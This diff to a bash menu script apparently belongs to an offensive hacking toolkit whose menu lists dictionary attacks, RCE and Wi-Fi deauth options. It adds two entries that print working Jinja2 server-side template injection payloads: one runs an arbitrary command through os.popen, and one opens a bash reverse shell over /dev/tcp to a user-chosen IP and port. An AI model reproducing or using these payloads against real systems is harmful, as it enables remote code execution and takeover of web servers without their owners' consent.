@@ -719,7 +719,7 @@ while true; do
 	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\t\t\t\t751. RCE with finger\n"
 	echo -ne " 754. get RPC info\t\t\t\t755. get RPC connect\n"
 	echo -ne " 756. smb connection\t\t\t\t757. rlogin dictionary attack\t\t\t\t758. rdesktop dictionary attack\n"
-	echo -ne " 9. wifi WPA with deauth attack\n"
+	echo -ne " 9. wifi WPA with deauth attack\t\t2251. SSTI RCE\t\t\t\t\t\t\t2252. SSTI RevShell\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -8740,6 +8740,28 @@ while true; do
 	;;
 	"2250")
 		Clona "its-a-feature/Mythic"
+	;;
+	"2251")
+		echo "Digit a command for the RCE"
+		read -p "(example, whoami): " CMD
+		if [[ "$CMD" != "" ]];
+		then
+		echo "{{config.__class__.__init__.__globals__['os'].popen(\"""$CMD""\").read()}}"
+		fi
+	;;
+	"2252")
+		echo "Digit your remote IP"
+		read -p "(example, 10.11.12.13): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your remote PORT"
+			read -p "(example, 9001): " MPRT
+			if [[ "$MPRT" != "" ]];
+			then
+				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >&/dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
+			fi
+		fi
+
 	;;
 	*)
 		echo "error, invalid choice"
